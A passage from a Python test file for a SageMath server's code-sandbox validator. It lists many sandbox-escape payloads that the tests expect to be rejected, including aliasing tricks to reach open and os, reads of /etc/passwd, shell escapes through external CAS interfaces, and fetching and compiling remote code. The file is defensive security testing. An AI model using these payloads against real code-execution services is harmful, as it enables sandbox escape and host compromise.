"""Adversarial tests for the AST policy.

Each payload here was confirmed to escape the sandbox on a real SageMath worker
before the hardening landed: the uid probes returned 1001 and the builtins
subscript wrote a file despite `open()` being documented as blocked.

These must fail against the unhardened validator. A security test that has never
failed is not evidence of anything.
"""

from __future__ import annotations

import ast

import pytest

from sagemath_mcp.security import (
    SECURITY_POLICY,
    SecurityViolation,
    _bound_names,
    validate_module,
)

# (id, payload). Every one of these reached outside the sandbox.
BYPASS_PAYLOADS = [
    ("os-in-namespace", "os.getuid()"),
    ("getattr-indirection", "getattr(os, 'getuid')()"),
    ("dunder-traversal", "().__class__.__bases__[0].__subclasses__()"),
    ("builtins-attribute", "__builtins__.__import__('os').getuid()"),
    ("builtins-subscript", "__builtins__['open']('/tmp/probe', 'w').write('escaped')"),
    ("sage-eval-string", "sage_eval(\"__import__('os').getuid()\")"),
    ("attribute-chain", "sage.misc.temporary_file.os.getuid()"),
]

# The README's security table claims these are blocked wholesale.
DOCUMENTED_AS_BLOCKED = [
    ("subprocess-run", "subprocess.run(['id'])"),
    ("subprocess-popen", "subprocess.Popen(['id'])"),
    ("pathlib-read", "pathlib.Path('/etc/passwd').read_text()"),
    ("socket-open", "socket.socket()"),
    ("shutil-copy", "shutil.copy('a', 'b')"),
    ("os-listdir", "os.listdir('/')"),
    ("os-environ", "os.environ"),
    ("os-chmod", "os.chmod('a', 511)"),
    ("sys-modules", "sys.modules"),
]


def _validate(code: str) -> None:
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


@pytest.mark.parametrize(
    ("case_id", "payload"), BYPASS_PAYLOADS, ids=[c for c, _ in BYPASS_PAYLOADS]
)
def test_known_bypasses_are_rejected(case_id: str, payload: str) -> None:
    with pytest.raises(SecurityViolation):
        _validate(payload)


@pytest.mark.parametrize(
    ("case_id", "payload"), DOCUMENTED_AS_BLOCKED, ids=[c for c, _ in DOCUMENTED_AS_BLOCKED]
)
def test_documented_blocks_are_actually_enforced(case_id: str, payload: str) -> None:
    """What the README promises must be what the validator does."""
    with pytest.raises(SecurityViolation):
        _validate(payload)


# Legitimate work must keep working; over-blocking would be its own outage.
ALLOWED = [
    ("arithmetic", "2 + 2"),
    ("sage-symbolics", "var('x'); integrate(sin(x), x)"),
    # No imports here any more: those three cases moved to the trusted policy,
    # where the generated templates need them. A caller reaching factorial or
    # math.sqrt does it through the preloaded namespace, which is how the
    # documented examples were always written.
    ("sage-names-without-import", "factorial(5)"),
    ("stdlib-names-without-import", "sqrt(2)"),
    ("polynomial-ring-internals", "R = PolynomialRing(QQ, ['a', 'b']); R.gens()"),
    ("method-calls", "G = graphs.PetersenGraph(); G.chromatic_number()"),
    ("attribute-on-result", "matrix([[1,2],[3,4]]).determinant()"),
    ("comprehension", "[k**2 for k in range(5)]"),
    ("function-def", "def f(y):\n    return y + 1\nf(2)"),
]


@pytest.mark.parametrize(("case_id", "payload"), ALLOWED, ids=[c for c, _ in ALLOWED])
def test_legitimate_code_still_passes(case_id: str, payload: str) -> None:
    _validate(payload)


# Every spelling below reaches a forbidden builtin WITHOUT naming it in call
# position. The first two were reported as still exploitable after the initial
# hardening: both returned the first line of /etc/passwd, through evaluate_sage
# and through calculate_expression. Checking ast.Call.func alone is not enough --
# the name has to be rejected wherever it is referenced.
ALIASING_PAYLOADS = [
    ("alias-assignment", "f = open\nf('/etc/passwd').readline()"),
    ("lambda-default", "(lambda f=open: f('/etc/passwd').readline())()"),
    ("alias-getattr", "g = getattr\ng(os, 'getuid')()"),
    ("list-literal", "[open][0]('/etc/passwd').readline()"),
    ("tuple-literal", "(open,)[0]('/etc/passwd').read()"),
    ("dict-value", "{'k': open}['k']('/etc/passwd').read()"),
    ("comprehension", "[fn for fn in (open,)][0]('/etc/passwd').read()"),
    ("bare-reference", "open"),
    ("default-in-def", "def g(h=eval):\n    return h('1+1')\ng()"),
    ("conditional-alias", "f = open if True else print\nf('/etc/passwd')"),
    ("alias-sage-eval", "se = sage_eval\nse(\"__import__('os').getuid()\")"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"), ALIASING_PAYLOADS, ids=[c for c, _ in ALIASING_PAYLOADS]
)
def test_forbidden_names_cannot_be_aliased(case_id: str, payload: str) -> None:
    with pytest.raises(SecurityViolation):
        _validate(payload)


def test_restricted_builtins_exclude_the_dangerous_ones() -> None:
    """The namespace backstop, independent of the AST rules.

    If a spelling ever slips past the validator again, the object should not be
    reachable in the first place.
    """
    from sagemath_mcp._sage_worker import _restricted_builtins

    available = _restricted_builtins()
    denied = (
        "open", "eval", "exec", "compile", "input", "globals", "locals", "vars",
    )
    for name in denied:
        assert name not in available, f"{name} is still reachable in the worker namespace"
    # Ordinary mathematics must keep working.
    # __import__ stays, and this asserts it deliberately: removing it was tried
    # for item 18 and broke Sage's Singular bindings with KeyError('__import__').
    for needed in ("abs", "len", "range", "sum", "int", "float", "print", "sorted", "__import__"):
        assert needed in available, f"{needed} was removed and normal code will break"


# Aliasing a forbidden MODULE, which the first alias fix did not cover: it
# checked forbidden call names only, so `m = os` still handed over the module.
MODULE_ALIAS_PAYLOADS = [
    ("bare module load", "os"),
    ("module alias", "m = os\nm.getuid()"),
    ("module alias via tuple", "(a, b) = (os, sys)\na.getuid()"),
    ("module in a container", "[os][0].getuid()"),
    ("module as a default", "(lambda m=os: m.getuid())()"),
    ("import-as alias", "from sage.all import os as m\nm.getuid()"),
    ("import-as under another name", "from sage.all import subprocess as sp"),
    ("sys alias", "s = sys\ns.modules"),
    ("shutil alias", "sh = shutil\nsh.rmtree('/tmp/x')"),
    ("socket alias", "sk = socket\nsk.socket()"),
    ("pathlib alias", "pl = pathlib\npl.Path('/etc/passwd').read_text()"),
    ("builtins alias", "b = builtins\nb.open('/etc/passwd')"),
]


@pytest.mark.parametrize(
    "label,payload", MODULE_ALIAS_PAYLOADS, ids=[p[0] for p in MODULE_ALIAS_PAYLOADS]
)
def test_module_aliases_are_blocked(label: str, payload: str) -> None:
    """`m = os` returned the container uid from real SageMath before this."""
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_forbidden_modules_are_absent_from_the_worker_namespace() -> None:
    """Second layer: even if a spelling slips past, there is nothing to bind.

    `from sage.all import *` binds os, sys and friends as ordinary globals.
    """
    from sagemath_mcp._sage_worker import _build_namespace

    namespace = _build_namespace()
    present = [
        name for name in SECURITY_POLICY.forbidden_attribute_parents if name in namespace
    ]
    assert not present, f"forbidden modules reachable in the worker namespace: {present}"


def test_specialized_tool_rejects_an_aliased_payload() -> None:
    """The public path, not just the validator.

    calculate_expression embeds its argument into generated code that runs under
    the trusted policy, so a fragment that escapes _validated_expression is not
    validated again downstream.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    for payload in (
        "(lambda f=open: f('/etc/passwd').readline())()",
        "[os][0].getuid()",
        "(lambda m=os: m.getuid())()",
    ):
        with pytest.raises(ToolError, match="security policy"):
            _validated_expression(payload)


def test_unparseable_fragments_are_screened_not_waved_through() -> None:
    """A fragment that will not parse used to skip validation entirely."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    # Still accepted: the documented equation spelling is not a Python expression.
    assert _validated_expression("x^2 - 1 = 0") == "x^2 - 1 = 0"
    # Screened at token level once no parse tree is available.
    with pytest.raises(ToolError):
        _validated_expression("R.<a> = os.getuid()")


# --- Item 18: caller strings interpolated into TRUSTED code -----------------
# Generated code runs under trusted_policy(), which re-permits sage_eval because
# the helper templates are built on it. Any caller string reaching that code
# unvalidated is therefore arbitrary execution: sage_eval evaluates a string at
# runtime, where the AST validator cannot see it. These four parameters were
# interpolated raw, and each returned the container uid from real SageMath.

TRUSTED_INTERPOLATION_PAYLOAD = "sage_eval('__import__(\"os\").getuid()')"


def _trusted_cases():
    p = TRUSTED_INTERPOLATION_PAYLOAD
    return [
        ("graph_operation.graph", "graph_operation",
         {"graph": f"CompleteGraph({p})", "operation": "order"}),
        ("graph_operation.graph literal branch", "graph_operation",
         {"graph": f"{{0:[1]}} if {p} else {{0:[1]}}", "operation": "order"}),
        ("group_operation.group", "group_operation",
         {"group": f"SymmetricGroup({p})", "operation": "order"}),
        ("coding_theory_operation.code_type", "coding_theory_operation",
         {"code_type": f"HammingCode(GF(2), {p} - 998)", "operation": "dimension"}),
        ("polynomial_ring_operation.base_ring", "polynomial_ring_operation",
         {"base_ring": f"QQ if {p} else QQ", "ring_vars": ["x"],
          "polynomials": ["x^2-1"], "operation": "ideal_dimension"}),
    ]


@pytest.mark.parametrize(
    "label,tool_name,kwargs", _trusted_cases(), ids=[c[0] for c in _trusted_cases()]
)
@pytest.mark.asyncio
async def test_trusted_templates_reject_sage_eval_payloads(
    label, tool_name, kwargs, monkeypatch
):
    """Rejected before the code is ever built, so no Sage runtime is needed."""
    from fastmcp.exceptions import ToolError

    from sagemath_mcp import runtime, server
    from sagemath_mcp.config import SageSettings
    from sagemath_mcp.session import SageSessionManager

    from .conftest import FakeContext

    manager = SageSessionManager(SageSettings(force_python_worker=True))
    monkeypatch.setattr(runtime, "SESSION_MANAGER", manager)
    tool = getattr(server, tool_name)
    try:
        with pytest.raises(ToolError, match="security policy"):
            await tool(ctx=FakeContext("trusted-interp"), **kwargs)
    finally:
        await manager.shutdown()


def test_prelude_rejects_names_that_are_not_identifiers() -> None:
    """_sage_prelude quotes each name into generated code.

    A name carrying a quote escapes that string literal, which is the same
    injection one level down.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _sage_prelude

    with pytest.raises(ToolError):
        _sage_prelude(["x', sage_eval('1+1'), 'y"])
    # Ordinary names still work.
    assert "'a'" in _sage_prelude(["a"])


# --- Reaching a forbidden function through an attribute chain -----------------
# The name checks look at bare Name nodes and Call.func. `sage` is an allowed
# import root and none of its segments are forbidden, so the same function is
# reachable one dot further along: sage.misc.sage_eval.sage_eval(...) returned
# the container uid. The string is invisible to the validator, exactly as in
# item 18 -- only the path to it is different.
ATTRIBUTE_PATH_PAYLOADS = [
    ("sage.misc.sage_eval", "sage.misc.sage_eval.sage_eval('__import__(\"os\").getuid()')"),
    ("sage.all.sage_eval", "sage.all.sage_eval('1')"),
    ("sage.repl.preparse", "sage.repl.preparse.preparse('2^3')"),
    ("nested attribute eval", "sage.misc.sage_eval.sage_eval"),
    ("persist.load", "sage.misc.persist.load('/tmp/x')"),
]


@pytest.mark.parametrize(
    "label,payload", ATTRIBUTE_PATH_PAYLOADS, ids=[p[0] for p in ATTRIBUTE_PATH_PAYLOADS]
)
def test_forbidden_functions_are_blocked_through_attribute_paths(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


# Sage's loaders execute code from a path -- and `load` accepts a URL, so this is
# remote code execution, not merely local file reading. Neither was forbidden.
LOADER_PAYLOADS = [
    ("load", "load('/tmp/payload.sage')"),
    ("attach", "attach('/tmp/payload.sage')"),
    ("load a URL", "load('https://example.invalid/payload.sage')"),
    ("aliased load", "runner = load\nrunner('/tmp/payload.sage')"),
]


@pytest.mark.parametrize("label,payload", LOADER_PAYLOADS, ids=[p[0] for p in LOADER_PAYLOADS])
def test_sage_loaders_are_blocked(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_ordinary_sage_attribute_use_still_works() -> None:
    """The gate is the final name, not the presence of a dot."""
    for code in (
        "sage.functions.log.exp(1)",
        "matrix([[1, 2], [3, 4]]).determinant()",
        "sage.rings.integer.Integer(5)",
        "plot(sin(x), (x, 0, 1)).matplotlib()",
    ):
        validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


# --- Sage's own dangerous helpers --------------------------------------------
# Sage's namespace is thousands of names deep and includes a compiler, a shell,
# a downloader and pickle. cython(get_remote_file(url)) is download, compile and
# execute in one expression, and none of it involved a name any rule mentioned.
SAGE_HELPER_PAYLOADS = [
    ("cython compiles code", "cython('print(1)')"),
    ("cython_lambda", "cython_lambda('int n', 'return n')"),
    ("fortran compiles code", "fortran('subroutine s\\nend')"),
    ("sh runs a shell", "sh('id')"),
    ("get_remote_file downloads", "get_remote_file('https://example.invalid/p.pyx')"),
    ("the whole chain", "cython(get_remote_file('https://example.invalid/p.pyx'))"),
    ("pickle load", "loads(b'')"),
    ("pickle dump", "dumps(1)"),
    ("save writes a file", "save(1, '/tmp/probe')"),
    ("db_save writes", "db_save(1, 'probe')"),
    ("trace debugger", "trace('1+1')"),
    ("via attribute path", "sage.misc.cython.cython('print(1)')"),
    ("shell via attribute", "sage.misc.sh.sh('id')"),
]


@pytest.mark.parametrize(
    "label,payload", SAGE_HELPER_PAYLOADS, ids=[p[0] for p in SAGE_HELPER_PAYLOADS]
)
def test_sage_helpers_that_execute_or_fetch_are_blocked(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_the_namespace_scrub_removes_a_modules_own_definitions() -> None:
    """The backstop, and the part that scales.

    Naming helpers in the policy gives a clear refusal; removing them by where
    they come from covers the one nobody has thought of, including anything a
    future Sage release adds to those modules. Exercised against a stdlib module
    so it runs without Sage.
    """
    from sagemath_mcp import _sage_worker

    names = _sage_worker._dangerous_sage_names.__wrapped__ if hasattr(
        _sage_worker._dangerous_sage_names, "__wrapped__"
    ) else _sage_worker._dangerous_sage_names

    original = _sage_worker._DANGEROUS_SAGE_MODULES
    original_list = _sage_worker._DANGEROUS_SAGE_NAME_LIST
    try:
        _sage_worker._DANGEROUS_SAGE_MODULES = ("json.encoder",)
        found = names()
        assert "JSONEncoder" in found, "a module's own definitions were not collected"

        # Stripping reads the baked-in list, not the derivation: that is what
        # keeps worker startup free.
        _sage_worker._DANGEROUS_SAGE_NAME_LIST = frozenset({"JSONEncoder"})
        namespace = {"JSONEncoder": object(), "Integer": object()}
        removed = _sage_worker._strip_dangerous_sage_names(namespace)
        assert removed == 1
        assert "JSONEncoder" not in namespace
        assert "Integer" in namespace, "unrelated names must survive"
    finally:
        _sage_worker._DANGEROUS_SAGE_MODULES = original
        _sage_worker._DANGEROUS_SAGE_NAME_LIST = original_list


def test_the_scrub_only_takes_what_a_module_defines() -> None:
    """sage.misc.persist has Integer and ZZ in scope; removing those would break
    the mathematics this server exists to do."""
    from sagemath_mcp import _sage_worker

    original = _sage_worker._DANGEROUS_SAGE_MODULES
    try:
        # json.encoder imports `re`; `re` is not defined there, so it must not
        # be collected merely for being in scope.
        _sage_worker._DANGEROUS_SAGE_MODULES = ("json.encoder",)
        assert "re" not in _sage_worker._dangerous_sage_names()
    finally:
        _sage_worker._DANGEROUS_SAGE_MODULES = original


def test_the_scrub_ignores_a_module_it_cannot_import() -> None:
    """A missing module must not break startup."""
    from sagemath_mcp import _sage_worker

    original = _sage_worker._DANGEROUS_SAGE_MODULES
    original_exports = _sage_worker._EXTERNAL_INTERFACE_EXPORTS
    try:
        # Both sources must be neutralised: with Sage installed the interface
        # export list still contributes its 74 names, which is the point of it.
        _sage_worker._DANGEROUS_SAGE_MODULES = ("definitely.not.a.module",)
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = "definitely.not.a.module"
        assert _sage_worker._dangerous_sage_names() == frozenset()
    finally:
        _sage_worker._DANGEROUS_SAGE_MODULES = original
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = original_exports


# --- Sage's interfaces to other CAS programs ---------------------------------
# Each spawns the real program, and those programs have their own shell escapes.
# gp('system("id > /tmp/x")') and maxima(...) both wrote a file as the container
# user -- arbitrary shell execution, from names no rule mentioned.
INTERFACE_PAYLOADS = [
    ("gp", "gp('system(\"id\")')"),
    ("maxima", "maxima('system(\"id\")')"),
    ("gap", "gap('Exec(\"id\")')"),
    ("singular", "singular('system(\"sh\")')"),
    ("octave", "octave('system(\"id\")')"),
    ("magma", "magma('System(\"id\")')"),
    ("a subprocess Sage", "sage0('__import__(\"os\").system(\"id\")')"),
]


@pytest.mark.parametrize(
    "label,payload", INTERFACE_PAYLOADS, ids=[p[0] for p in INTERFACE_PAYLOADS]
)
def test_external_cas_interfaces_are_blocked(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_the_interface_export_list_is_used_when_it_can_be_imported() -> None:
    """Sage's own list is the source of truth; here it is stood in for.

    Without Sage the import fails and the set is empty, so the branch that
    actually removes the interfaces would never run in the unit suite.
    """
    from sagemath_mcp import _sage_worker

    original_exports = _sage_worker._EXTERNAL_INTERFACE_EXPORTS
    original_modules = _sage_worker._DANGEROUS_SAGE_MODULES
    try:
        # json.decoder exports JSONDecoder and friends; it stands in for
        # sage.interfaces.all, whose whole export list is what gets removed.
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = "json.decoder"
        _sage_worker._DANGEROUS_SAGE_MODULES = ()
        found = _sage_worker._dangerous_sage_names()
        assert "JSONDecoder" in found, "the export list was not consumed"
        # Unlike the per-module rule, everything exported goes -- an interface
        # re-exported from elsewhere is still an interface.
        assert "scanstring" in found
    finally:
        _sage_worker._EXTERNAL_INTERFACE_EXPORTS = original_exports
        _sage_worker._DANGEROUS_SAGE_MODULES = original_modules


# --- Imports re-create everything the namespace scrub removed ------------------
# The scrub takes dangerous helpers out of the worker namespace, but a caller who
# imports the module gets a fresh copy. Measured against real SageMath:
#   from sage.misc.cython import compile_and_load as f; f('print(1)')  compiled
#   from sage.interfaces.gp import Gp as P; P()('2+2')                 spawned GP
#   from sage.misc.persist import unpickle_global as f
#   f('os', 'system')('id')                                            ran a shell
# Aliasing hides the name from every rule, so the gate has to be the import.
IMPORT_PAYLOADS = [
    ("from-import aliased", "from sage.misc.cython import compile_and_load as f\nf('print(1)')"),
    ("interface class", "from sage.interfaces.gp import Gp as P\nP()('2+2')"),
    ("module alias", "import sage.misc.cython as c\nc.compile_and_load('x')"),
    ("unpickle_global to os.system",
     "from sage.misc.persist import unpickle_global as f\nf('os', 'system')('id')"),
    ("sage.all wholesale", "from sage.all import *"),
    ("plain sage", "import sage"),
    ("stdlib is not special", "import math\nmath.sqrt(4)"),
    ("io", "import io"),
]


@pytest.mark.parametrize("label,payload", IMPORT_PAYLOADS, ids=[p[0] for p in IMPORT_PAYLOADS])
def test_caller_code_cannot_import_anything(label, payload) -> None:
    """Callers get a preloaded namespace; they never need an import.

    Allowing `sage.*` was there for the generated prelude, and it handed callers
    the whole library back one import at a time.
    """
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_generated_code_may_still_import_what_its_templates_need() -> None:
    """The prelude does `from sage.all import *`; templates use base64 and io."""
    from sagemath_mcp.security import trusted_policy

    for code in (
        "from sage.all import *\n1",
        "from sage.all import sage_eval\n1",
        "import sage.all as _sage_ns\n1",
        "import base64\n1",
        "import io\n1",
    ):
        validate_module(ast.parse(code), code=code, policy=trusted_policy())


def test_dangerous_module_paths_are_blocked_as_attributes_too() -> None:
    """Blocking the import is not enough if `sage` itself is in the namespace."""
    for code in (
        "sage.misc.persist.unpickle_global('os', 'system')",
        "sage.interfaces.gp.Gp()",
        "sage.misc.remote_file.get_remote_file('http://x/y')",
        "sage.repl.load.load_wrap('x')",
    ):
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


def test_even_generated_code_may_not_import_a_forbidden_module() -> None:
    """The trusted policy relaxes sage_eval and the import allowlist, nothing else.

    `sage` is allowlisted there, and `from sage.all import os as m` binds the real
    os module under a name no later rule would recognise. Unreachable from caller
    code now that callers cannot import at all, which is exactly why it needs a
    test of its own.
    """
    from sagemath_mcp.security import trusted_policy

    for code in (
        "from sage.all import os as m",
        "from sage.all import subprocess",
        "import sage.all\nfrom sage.all import sys as s",
    ):
        with pytest.raises(SecurityViolation, match="not permitted"):
            validate_module(ast.parse(code), code=code, policy=trusted_policy())


# --- Writing files through object methods -------------------------------------
# .save() was on the forbidden list; .dump(), .save_image() and .export_jmol()
# were not, and each wrote a real file. Matched by prefix now, because Sage's
# persistence API is longer than any list of names would stay.
PERSISTENCE_PAYLOADS = [
    ("dump", "(1/2).dump('/tmp/x')"),
    ("matrix dump", "matrix([[1,2],[3,4]]).dump('/tmp/x')"),
    ("save_image", "plot(sin(x), (x,0,1)).save_image('/tmp/x.png')"),
    ("export_jmol", "sphere((0,0,0), 1).export_jmol('/tmp/x.spt')"),
    ("savefig to a path", "plot(sin(x), (x,0,1)).matplotlib().savefig('/tmp/x.png')"),
    ("save", "plot(sin(x), (x,0,1)).save('/tmp/x.png')"),
]


@pytest.mark.parametrize(
    "label,payload", PERSISTENCE_PAYLOADS, ids=[p[0] for p in PERSISTENCE_PAYLOADS]
)
def test_caller_code_cannot_persist_to_disk(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_generated_plot_templates_may_still_render_to_a_buffer() -> None:
    """The plots render with .savefig(BytesIO) -- a prefix rule that broke that
    would take all three plotting tools with it."""
    from sagemath_mcp.security import trusted_policy

    code = "_fig.savefig(_buf, format='png')"
    validate_module(ast.parse(code), code=code, policy=trusted_policy())


def test_a_caught_exception_name_is_readable() -> None:
    """`except ... as err` binds a name the caller then reads."""
    code = "try:\n    1 / 0\nexcept ZeroDivisionError as err:\n    str(err)"
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


def test_var_with_a_non_literal_argument_declares_nothing() -> None:
    """`var(name)` cannot be read statically, so it binds nothing.

    The names it makes at runtime land in the session namespace, and the worker
    reports those on the next call -- so this refuses only within the snippet
    that made them, which is the honest answer for a static check.
    """
    label = "t"  # noqa: F841 - mirrors the caller code below
    code = "label = 't'\nvar(label)\nlabel"
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)

    # And a literal still declares, including several at once.
    code = "var('p q')\np + q"
    validate_module(ast.parse(code), code=code, policy=SECURITY_POLICY)


def test_a_binding_primitive_cannot_launder_a_name_across_calls() -> None:
    """Session trust is what validated code BOUND, not what the namespace gained.

    `lazy_import('os', 'system')` reads no forbidden name: it binds one. Trusting
    the namespace diff meant call one created the binding and call two read it
    back as "the caller's own" -- and ran a shell. Recording static bindings from
    approved code closes that for every such primitive, including any not yet
    found.
    """
    created = _bound_names(ast.parse("lazy_import('os', 'system')"))
    assert "system" not in created, (
        "a name created by a call, not an assignment, must not count as bound"
    )

    # An assignment does count, which is what keeps stateful sessions working.
    assert "total" in _bound_names(ast.parse("total = 1 + 1"))
    assert {"p", "q"} <= _bound_names(ast.parse("var('p q')"))


@pytest.mark.parametrize(
    "payload",
    [
        "lazy_import('os', 'system')",
        "unpickle_function(b'x')",
        "pickle_function(sin)",
        "load_session('/tmp/x')",
        "save_session('/tmp/x')",
        "set_verbose_files('/tmp/x')",
    ],
)
def test_binding_and_pickle_primitives_are_gone(payload: str) -> None:
    """Each was reachable, and each is a way to execute or persist."""
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_a_binding_cannot_authorize_a_dunder() -> None:
    """The gap the allowlist leaves, and why it is closed at the source.

    Every name live in the worker namespace is on the allowlist except nine
    dunders (`__builtins__`, `__import__`, `__build_class__`, ...). A caller
    binding is trusted without consulting the allowlist, so a binding that never
    executes -- `if False: __builtins__ = 1`, or `except ValueError as
    __builtins__`, which binds without ever naming the object -- would authorize
    reading the real one, and `__builtins__['__import__']('os')` is a shell.

    Reading a dunder is independently blocked, so this was defence in depth
    rather than a hole. But that made the whole allowlist rest on a rule
    elsewhere, and on the accident that nothing non-dunder sits in the gap. A
    name a caller may not read is not a name their binding may authorize.
    """
    for code in (
        "if False:\n    __builtins__ = 1",
        "try:\n    raise ValueError()\nexcept ValueError as __builtins__:\n    pass",
        "for __import__ in []:\n    pass",
        "def __build_class__():\n    pass",
        "import os as __loader__",
    ):
        bound = _bound_names(ast.parse(code))
        assert not any(name.startswith("__") for name in bound), (
            f"{code!r} authorized a dunder: {sorted(bound)}"
        )

    # The ordinary case is untouched: real bindings still authorize their names.
    assert "total" in _bound_names(ast.parse("total = 1"))
    assert "err" in _bound_names(
        ast.parse("try:\n    pass\nexcept ValueError as err:\n    pass")
    )


def test_a_never_executed_binding_still_cannot_reach_a_blocked_name() -> None:
    """The other half: static binding is deliberately an over-approximation.

    `_bound_names` does not ask whether the assignment runs -- it cannot, short
    of executing the code. So the guarantee has to come from the other side:
    authorizing a name must never be enough to reach an object the caller could
    not otherwise have.
    """
    module = ast.parse("if False:\n    __builtins__ = 1\n__builtins__['__import__']('os')")
    with pytest.raises(SecurityViolation, match="dunder"):
        validate_module(module, extra_allowed_names=frozenset({"__builtins__"}))


# --- String-based attribute traversal ------------------------------------------
# Every attribute rule this server has is enforced on the AST: the parent and the
# attribute name are both read out of the source. `operator.attrgetter` takes its
# path as a *runtime string*, so none of that machinery sees it, and Sage's
# namespace binds `sage` itself -- which made the whole module tree reachable.
#
# Confirmed against SageMath 10.9 before the fix, each of these worked:
#   operator.attrgetter("misc.persist.unpickle_global")(sage)  -> the real function
#   operator.attrgetter("__builtins__")(warnings)              -> the builtins dict
#   operator.attrgetter("__class__.__base__.__subclasses__")(1)()
#   operator.methodcaller("save", "/tmp/x")(matrix([[1, 2], [3, 4]]))  -> wrote it
# The first is arbitrary code execution; the second reaches __import__.

STRING_TRAVERSAL_PAYLOADS = [
    ("attrgetter-sage-tree", 'operator.attrgetter("misc.persist.unpickle_global")(sage)'),
    ("attrgetter-builtins", 'operator.attrgetter("__builtins__")(warnings)'),
    ("attrgetter-subclasses", 'operator.attrgetter("__class__.__base__.__subclasses__")(1)()'),
    ("methodcaller-save", 'operator.methodcaller("save", "/tmp/x")(matrix([[1, 2], [3, 4]]))'),
    ("itemgetter", 'operator.itemgetter(0)([1, 2])'),
    ("bare-attrgetter", 'attrgetter("__class__")(1)'),
    ("bare-methodcaller", 'methodcaller("save", "/tmp/x")(matrix([[1, 2]]))'),
]


@pytest.mark.parametrize(
    "code", [c for _, c in STRING_TRAVERSAL_PAYLOADS],
    ids=[i for i, _ in STRING_TRAVERSAL_PAYLOADS],
)
def test_string_based_attribute_traversal_is_refused(code: str) -> None:
    """No primitive may fetch an attribute by a name the AST cannot see.

    This is a class, not a list of names: any such primitive makes every
    attribute rule here decorative. The defence is that none is reachable.
    """
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(code))


@pytest.mark.parametrize("name", ["operator", "warnings", "pari", "oeis"])
def test_dangerous_modules_are_not_offered_to_callers(name: str) -> None:
    """`pari` ran a shell; `oeis` reached the network; `operator` traversed.

    `pari('system("id > /tmp/x")')` wrote a file as the container user -- the
    PARI *library* interface was never covered by the external-interface scrub
    that took `gp` and `maxima`, because it comes from `sage.libs.pari`.
    """
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    assert name not in ALLOWED_CALLER_NAMES, (
        f"{name!r} is offered to callers; it was proven to execute a shell, reach "
        f"the network or defeat the attribute rules"
    )
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(f"{name}.anything"))


def test_no_module_object_exposes_a_getattr_primitive() -> None:
    """The structural claim, checked rather than asserted.

    Sage binds 22 module objects, `sage` among them, so a single string-path
    primitive anywhere reaches the entire tree. Instead of chasing modules, the
    rule is that the primitives themselves are unreachable -- and `getattr`,
    `setattr` and `vars` were already refused, which is why this only ever
    needed `operator` to be closed.
    """
    for primitive in ("getattr", "setattr", "vars", "globals", "eval", "exec", "compile"):
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(f"{primitive}(1)"))


# --- Sage's own string-path primitives -----------------------------------------
# The `operator` round blocked Python's attrgetter/methodcaller and left Sage's
# equivalents in place, which is fixing the instance instead of the class. All
# three of these were confirmed against SageMath 10.9, each writing a real file:
#
#   attrcall('save', '/tmp/x')(matrix([[1, 2], [3, 4]]))
#   raw_getattr(M, 'save')(M, '/tmp/x')
#   getattr_debug(M, 'save')('/tmp/x')
#
# `getattr_debug` is a full getattr equivalent and reached
# `__class__.__base__.__subclasses__()` as well. `raw_getattr` bypasses the
# descriptor protocol, so it returns a descriptor rather than the class -- but
# it resolves methods, which is all a file write needs.

SAGE_STRING_PATH_PAYLOADS = [
    ("attrcall", "attrcall('save', '/tmp/x')(matrix([[1, 2], [3, 4]]))"),
    ("call-method", "call_method(matrix([[1, 2]]), 'save', '/tmp/x')"),
    ("attrcall-object", "AttrCallObject('save', ('/tmp/x',), {})(matrix([[1, 2]]))"),
    ("raw-getattr", "raw_getattr(matrix([[1, 2]]), 'save')"),
    ("getattr-debug", "getattr_debug(matrix([[1, 2]]), 'save')"),
    ("unpickle-override", "register_unpickle_override('os', 'system', int)"),
]


@pytest.mark.parametrize(
    "code", [c for _, c in SAGE_STRING_PATH_PAYLOADS],
    ids=[i for i, _ in SAGE_STRING_PATH_PAYLOADS],
)
def test_sage_string_path_primitives_are_refused(code: str) -> None:
    """Sage ships its own attrgetter, and it is not called attrgetter."""
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(code))


@pytest.mark.parametrize(
    "name", ["attrcall", "call_method", "AttrCallObject", "raw_getattr",
             "getattr_debug", "register_unpickle_override"],
)
def test_sage_string_path_primitives_are_not_offered(name: str) -> None:
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    assert name not in ALLOWED_CALLER_NAMES, (
        f"{name!r} resolves an attribute from a runtime string, which defeats every "
        f"attribute rule in security.py at once"
    )


def test_the_modules_that_define_attribute_plumbing_are_all_scrubbed() -> None:
    """The class, not the instance -- three rounds of the same finding.

    Blocking names one at a time has now missed `operator`, then Sage's
